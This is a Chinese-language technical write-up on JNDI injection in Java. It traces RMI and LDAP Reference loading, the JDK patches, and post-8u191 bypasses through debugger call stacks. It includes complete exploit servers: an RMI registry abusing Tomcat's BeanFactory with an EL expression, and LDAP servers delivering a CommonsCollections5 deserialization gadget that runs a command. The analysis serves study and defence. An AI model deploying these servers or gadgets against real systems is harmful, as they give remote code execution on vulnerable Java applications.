JNDI
====

JNDI（全称Java Naming and Directory Interface）是用于目录服务的Java API，它允许Java客户端通过名称发现和查找数据和资源(以Java对象的形式)。与与主机系统接口的所有Java api一样，JNDI独立于底层实现。此外，它指定了一个服务提供者接口(SPI)，该接口允许将目录服务实现插入到框架中。通过JNDI查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。

JNDI注入+rmi
==========

JNDIClient

```php
public class JNDIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        IRemoteObj o = (IRemoteObj) initialContext.lookup("rmi://127.0.0.1:1099/remoteOb");
        System.out.println(o.sayHello("hello"));
    }
}
```

JNDIServer

```php
public class JNDIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        LocateRegistry.createRegistry(1099);
        initialContext.rebind("rmi://localhost:1099/remoteOb",new RemoteObImpl());
    }
}
```

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-8f5b9b566f701b83c077ed1f1ca54e62d502a280.png)

跟进一下客户端lookup方法,跟进到RegistryContext类的lookup方法，从这里可以看出来，其实调用的还是RMI的东西。如果客户端的lookup参数可控，就可以让它访问我们恶意的链接了。  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-06fec7bb74b27b3a1eb50320932added11301ad0.png)

绑定引用对象
------

```php
public class JNDIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Reference reference = new Reference("TestRef", "TestRef", "http://localhost:6666/");
        initialContext.rebind("rmi://localhost:1099/remoteOb",reference);
    }
}
```

看一下Reference类。工厂，第一个参数类型className，第二个工厂名factory，工厂的位置。

```php

    /**
      * Constructs a new reference for an object with class name 'className',
      * and the class name and location of the object's factory.
      *
      * @param className The non-null class name of the object to which
      *                         this reference refers.
      * @param factory  The possibly null class name of the object's factory.
      * @param factoryLocation
      *         The possibly null location from which to load
      *         the factory (e.g. URL)
      * @see javax.naming.spi.ObjectFactory
      * @see javax.naming.spi.NamingManager#getObjectInstance
      */
    public Reference(String className, String factory, String factoryLocation) {
        this(className);
        classFactory = factory;
        classFactoryLocation = factoryLocation;
    }
```

启一个JNDIServer，在testref.class文件所在的位置起一个http的web服务，将reference引用绑定在remoteOb上，然后在JNDIClient客户端访问，

```php
public class JNDIServer {
    public static void main(String[] args) throws Exception{
        LocateRegistry.createRegistry(1099);
        InitialContext initialContext = new InitialContext();
        Reference reference = new Reference("TestRef", "TestRef", "http://localhost:6666/");
        initialContext.rebind("rmi://localhost:1099/remoteOb",reference);
    }
}
```

适用场景就是当我们能控制服务端lookup的参数时，就可以访问恶意的对象。

接下来具体分析流程。在客户端跟进lookup方法。其实就是一系列的调用，过程如下图。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-cd21a41cb0b76b3dcf057bdb3badfe2966f91c44.png)

这里获取到的对象是ReferenceWrapper\_Stub，并不是服务端绑定的Reference，这是因为服务端调用了一个encodeObject方法将Reference类转成了ReferenceWrapper，所以客户端获取到之后要decode。  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-785f1a272429d2ff390ecae5469dc0c950aa3a90.png)

到这里的调用栈如下。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-f02b6b1ad5438e9a3271556d65f70e9a946ed568.png)

decode之后就拿到了原先的Reference，同时在这个方法中调用了NamingManager.getObjectInstance()方法，跟进  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-641f3f7feff66409ff21acc66ac69efab74014c8.png)  
在319行调用了getObjectFactoryFromReference方法，从引用中获取对象工厂

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-c486744e5106b65905392cc8e6d77f02e445e3c2.png)  
这个方法中首先调用loadClass加载，调用AppClassLoader本机加载，此时是加载失败找不到的

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-fac90df2fdd7a1e4b4011b3c2ce9f43699a67969.png)

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-dab932ed43d66f7f6d3abebc855c21c32556ba64.png)

接下来就是利用codebase查找，codebase就是上面提到Reference的factoryLocation，在调用loadClass加载  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-e3c565811d7a8c11ce55b7b99011e7c449e3de08.png)

把codebase传入URLClassLoader，利用loadClass加载  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-5ab9390dc6df9d1426a51a0afdc45e1bb204e837.png)  
这个里面就会对应初始化加载，对应URL下面的类。  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-d5616442967841c6f0ff345428e88fc9efe42876.png)  
找到之后newInstance实例化，执行完这一步就可以弹出计算器了。  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-dfc152a4d664598f8fffb2356e6e78e2fa734cac.png)

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-8c6207e2d8d40abb2d9175abc9a6d5a5a9441ca3.png)  
在JDK 6u132, JDK 7u122, JDK 8u113中Java限制了通过RMI远程加载Reference工厂类，com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。  
在RegistryContext类中的trustURLCodebase默认值是false,所以程序不会再向下执行。  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-0ed50c402d935a07afa582abddccac598540e4eb.png)

JNDI注入+ldap
===========

但是需要注意的是JNDI不仅可以从通过RMI加载远程的Reference工厂类，也可以通过LDAP协议加载远程的Reference工厂类，但是在修复RMI的时候并没有对LDAP进行修复，所以在JDK 11.0.1、8u191、7u201、6u211之前LDAP还是可以利用的。

使用JNDI工具启动一个LDAPF服务。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-a045bb2cb6f786d0806cee6b63d925687d8c1fd1.png)

客户端调试跟踪分析流程

```php
    public static void main(String[] args) throws NamingException {
        Object object=new InitialContext().lookup("ldap://127.0.0.1:1389/koh13g");
    }
```

根据追踪lookup方法，最后走到PartialCompositeContext类的lookup方法，方法中又调用了p\_lookup方法，这个方法中又要用了c\_lookup方法。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-fbe06e14f927e7d5ff250220eb9e3b23c7a60984.png)

c\_lookup方法要用了decodeObject方法，走到这里就想到在rmi中也要用了这个方法，并看到传入的参数var4其实跟rmi也是一样的，codebase、类名、工厂等。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-58418ad1e2330b3d87efa2dd2eeba8d2a84ce102.png)

在decodeObject方法又分了几种情况，因为jndi支持序列化、引用的、远程对象的，通过获取到的属性来判断是属于那种方式。

因为此时为引用，所以会调用decodeReference方法，方法中把类名啥的都获取到。然后回到c\_lookup方法。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-ecb18d3f5c9096000a5c88cf31546fd6da32320d.png)

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-ca8e80752c8cd370eaa1d1e8abe48f8a99849bd5.png)

c\_lookup方法中又调用了DirectoryManager.getObjectInstance()方法，在rmi中是调用的NamingManager.getObjectInstance()方法，后续的流程在方法中又调用getObjectFactoryFromReference()方法，通过loadClass加载远程加载对象。调用AppClassLoader本机加载，此时是加载失败找不到的,接下来就是利用codebase查找，codebase就是上面提到Reference的factoryLocation，再利用loadClass加载等等。

因为RMI跟LDAP前半部分的调用流程并不一样，当RMI修改了流程中的decodeObject方法，并不会影响到LDAP流程中的decodeObject方法，在之后的版本Java也对LDAP Reference远程加载Factory类进行了限制，在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的值默认为false。

用8u333测试了一下，在VersionHelper12类的loadClass方法中有trustURLCodebase属性的判断，如下图所示。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-62c0e549c1a95a0f19022701d45b776880ea1e3c.png)

JDK版本 &gt; 8u191
================

通过加载本地类
-------

从上面的RMI跟LDAP的过程中可以看到，都是利用远程加载并也已经修复了，但是不是也可以利用本地的类进行利用，对于本地的类也是有要求的，这个类必须是个工厂类，该工厂类型必须实现javax.naming.spi.ObjectFactory 接口，因为在javax.naming.spi.NamingManager#getObjectFactoryFromReference最后的return语句对工厂类的实例对象进行了类型转换return (clas != null) ? (ObjectFactory) clas.newInstance() : null;；并且该工厂类至少存在一个 getObjectInstance() 方法，根据网上文章org.apache.naming.factory.BeanFactory是可利用的，并且该类存在于Tomcat依赖包中应用比较广泛。

**Tomcat8**

首先加载maven,如果com.springsource.org.apache.el包获取失败，可以下载对应jar包然后导入。

```php
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>

<dependency>
    <groupId>org.apache.el</groupId>
    <artifactId>com.springsource.org.apache.el</artifactId>
    <version>7.0.26</version>
</dependency>
```

服务端示例代码如下

```php
    public static void main(String[] args) throws Exception{

        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);

    }
```

客户端示例代码如下

```php
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("rmi://localhost:1097/Object");
    }
```

效果图如下所示  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-4e6cfe21d46f63eb9e89d0fe9a3ed926361380f4.png)

调试跟踪分析流程

前面的流程跟RMI和LDAP是一样的，跟到RegistryContext.decodeObject()方法，工厂就是指定的org.apache.naming.factory.BeanFactory，  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-cac6c9cb6c6d8a6b3b82655e3ac0009196a59d6a.png)

接下来的流程也一样，走到getObjectFactoryFromReference方法，接着就是loadClass本地加载对应的类，clas不是null，就说明本地加载到了，

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-036c295985b55eda169cf1d1af999f3ceb937624.png)

最后在getObjectInstance方法中反射的调用invoke执行EL表达式，完成命令执行。  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-baee8ebf077d87fa8984096ab08252566819a212.png)

调用栈

```php
getObjectInstance:211, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:9, JNDIClient (org.example)
```

触发本地存在的Gadget
-------------

加入本地依赖中存在漏洞，可以尝试出发本地漏洞，这里存在CC依赖，CommonsCollections5来尝试

```php
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class JNDIServer {

        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main ( String[] tmp_args ) throws Exception{
            String[] args=new String[]{"http://x.x.x.x/#aaa"};
            int port = 6666;

            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }

        private static class OperationInterceptor extends InMemoryOperationInterceptor {

            private URL codebase;

            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }

            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }

            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {

                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaSerializedData",CommonsCollections5());

                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }

        private static byte[] CommonsCollections5() throws Exception{
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };

            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
            BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
            Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            return byteArrayOutputStream.toByteArray();
        }

}
```

客户端尝试触发，效果如下图

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-b84f24b761213fa4afd8f3aa6473492d7c1ec0ea.png)

调试跟踪分析流程

前面流程跟LDAP流程相同，还是会走到Obj类中的decodeObject方法，JAVA\_ATTRIBUTES字段有"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation",JAVA\_ATTRIBUTES\[1\]就是javaSerializedData，在起服务端的时候配置了这个字段，不为空就进入到deserializeObject方法中

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-248a2cc752ede4cfe4f8925df262bdf44c710503.png)

deserializeObject方法中对var20进行反序列化，var20就是服务端在其中时给javaSerializedData的赋值，就是恶意的序列化数据。  
![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-4ba724ad953921f71d5e78bff7adfdbf07314d41.png)

调用栈如下

```php
deserializeObject:532, Obj (com.sun.jndi.ldap)
decodeObject:239, Obj (com.sun.jndi.ldap)
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:9, JNDIClient (org.example)
```

其实还有一处反序列化的点，在com/sun/jndi/ldap/Obj.java#decodeReference中，这个方法中也调用了上面例子中反序列化时经过的方法deserializeObject，如果程序能走到这里，也就意味着也可以进行反序列化操作。

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-8658d98d122ed4194c914ce28c580a8ba15c3ed8.png)

首先要看一下怎样才能进入decodeReference方法中，在上面例子中讲到通过Obj类中的decodeObject方法在启动时给JAVA\_ATTRIBUTES的javaSerializedData赋值进入了deserializeObject方法，但是在decodeObject方法中也调用了decodeReference方法，如果要进入要在启动时给JAVA\_ATTRIBUTES的objectClass赋值。

在反序列化利用时调用的参数时JAVA\_ATTRIBUTES的javaReferenceAddress，所以要把恶意代码赋值给这个参数，但这个参数在赋值时有如下要求：

- 第一个字符为分隔符
- 第一个分隔符与第二个分隔符之间，表示Reference的position，为int类型
- 第二个分隔符与第三个分隔符之间，表示type，类型
- 第三个分隔符是双分隔符的形式，则进入反序列化的操作
- 序列化数据用base64编码

javaClassName这个参数不能去掉，因为在调用decodeObject方法时对JAVA\_ATTRIBUTES的javaClassName进行了判断，只有不为空时才能进入decodeObject方法

```php
    static Object decodeObject(Attributes var0) throws NamingException {
        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

        try {
            Attribute var1;
            if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
                ClassLoader var3 = helper.getURLClassLoader(var2);
                return deserializeObject((byte[])((byte[])var1.get()), var3);
            } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
            } else {
                var1 = var0.get(JAVA_ATTRIBUTES[0]);
                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
            }
        } catch (IOException var5) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var5);
            throw var4;
        }
    }
```

启动的服务端参考如下：

```php
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Encoder;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class JNDIServer {
        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main ( String[] tmp_args ) throws Exception{
            String[] args=new String[]{"http://x.x.x.x/#aaa"};
            int port = 6666;

            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }

        private static class OperationInterceptor extends InMemoryOperationInterceptor {

            private URL codebase;

            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }

            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }

            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {

                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaReferenceAddress","$1$String$$"+new BASE64Encoder().encode(CommonsCollections5()));
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$

                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }

        private static byte[] CommonsCollections5() throws Exception{
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };

            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
            BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
            Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            return byteArrayOutputStream.toByteArray();
        }

}
```

客户端尝试触发，效果如下图

![](https://shs3.b.qianxin.com/attack_forum/2024/02/attach-b84f24b761213fa4afd8f3aa6473492d7c1ec0ea.png)

调用栈如下

```php
deserializeObject:532, Obj (com.sun.jndi.ldap)
decodeReference:478, Obj (com.sun.jndi.ldap)
decodeObject:251, Obj (com.sun.jndi.ldap)
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:9, JNDIClient (org.example)
```

参考链接

```php
https://www.veracode.com/blog/research/exploiting-jndi-injections-java
https://xz.aliyun.com/t/8214#toc-3
https://www.bilibili.com/video/BV1P54y1Z7Lf/
```